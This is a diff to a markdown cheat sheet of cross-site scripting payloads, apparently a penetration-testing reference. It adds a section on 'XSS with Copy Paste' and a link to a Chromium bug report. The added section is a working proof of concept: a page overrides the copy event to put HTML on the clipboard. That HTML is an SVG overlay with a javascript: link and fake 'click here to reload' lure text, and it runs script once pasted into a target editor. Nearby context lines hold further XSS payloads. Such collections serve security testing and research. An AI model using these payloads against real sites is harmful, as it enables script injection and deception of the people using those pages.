@@ -17,6 +17,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [XSS in hidden input](#xss-in-hidden-input)
   - [DOM based XSS](#dom-based-xss)
   - [XSS in JS Context](#xss-in-js-context)
+  - [XSS with Copy Paste](#xss-with-copy-paste)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
 - [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [XSS in PostMessage](#xss-in-postmessage)
@@ -215,6 +216,41 @@ Based on a DOM XSS sink.
 ; alert(1);//
 // (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
 ```
+
+### XSS with Copy Paste
+
+```javascript
+<script type=payload id=payload>
+  <div contenteditable=false>
+<svg style="position:fixed;left:0;top:0;width:100%;height:100%">
+<use href="data:application/xml,
+<svg id='x' xmlns='http://www.w3.org/2000/svg'>
+<a href='javascript:alert(document.domain)'>
+    <rect width='100%' height='100%' fill='lightblue' />
+     <text x='0' y='0' fill='black'>
+       <tspan x='0' dy='1.2em'>Oops, there's something wrong with the page!</tspan>
+     <tspan x='0' dy='1.2em'>Please click here to reload.</tspan>
+</svg>#x">
+</script>
+ 
+The page is really safe. Just
+<button onclick=document.execCommand('copy')>copy</button>
+something from here!<br>
+<span id=st style=color:red></span>
+<script>
+  document.oncopy = ev => {
+    ev.preventDefault();
+    ev.clipboardData.setData('text/html', payload.text);
+    st.textContent = 'Good! Now paste it';
+  }
+  
+</script>
+```
+
+Run in [jsbin](https://jsbin.com/kiniqawati/edit?html,output)
+
+Click Copy and Paste in target editor
+
 
 ## XSS in wrappers javascript and data URI
 
@@ -1155,3 +1191,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
+- [XSS with Copy Paste](https://bugs.chromium.org/p/chromium/issues/detail?id=1040755)
